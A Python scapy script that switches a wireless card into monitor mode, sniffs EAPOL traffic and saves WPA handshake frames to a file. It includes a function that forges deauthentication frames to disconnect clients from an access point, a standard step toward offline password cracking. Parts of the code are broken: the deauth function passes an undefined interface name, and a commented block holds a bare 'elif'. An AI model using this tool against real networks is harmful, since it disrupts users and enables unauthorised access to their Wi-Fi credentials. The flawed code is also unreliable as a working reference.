from scapy.all import *
from scapy.contrib import *
import sys
import subprocess

def parse_packets(packet, output):
    if packet.haslayer(Dot11Auth) or packet.haslayer(EAPOL):
        wrpcap(output, packet, append=True)
    '''
    elif:
        if packet.haslayer(Dot11):
            cli_mac = packet[Dot11].addr2
            bssid   = packet[Dot11].addr1
            deauth(bssid, cli_mac)
    '''
def check_iface():
    proc = subprocess.Popen(["iw", "dev"], stdout=subprocess.PIPE)
    iw_results = proc.stdout.read()

    return (b"mon" not in iw_results)

def create_iface():
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["airmon-ng", "start", "wlan0"])
    subprocess.run(["ifconfig", "wlan0mon", "up"])

def set_channel(channel):
    subprocess.run(["iwconfig", "wlan0mon", "channel", str(channel)])

def deauth(ap_mac, client_mac):
    Deauth_packet = RadioTap()\
                    /Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)\
                    /Dot11Deauth(reason=7)
    for _ in range(10):
        send(Deauth_packet, iface=wlan0mon, count=10, inter=0.1)


def main(args):
    try:
        outpath = args[1]
        channel = args[2]
    except IndexError:
        print("Need a output file and a wifi channel to listen on")
        exit(0)
    
    if(check_iface()):
        create_iface()
    
    set_channel(channel)
    print("Now beginning to sniff")
    packets = sniff(iface='wlan0mon', filter="ether proto 0x888e")
    print(packets)
    for packet in packets: 
        parse_packets(packet, outpath)

if __name__ == "__main__":
    #conf.layers.filter([Dot11, Dot11Auth, EAPOL, EAP])
    main(sys.argv)
    #conf.layers.unfilter()
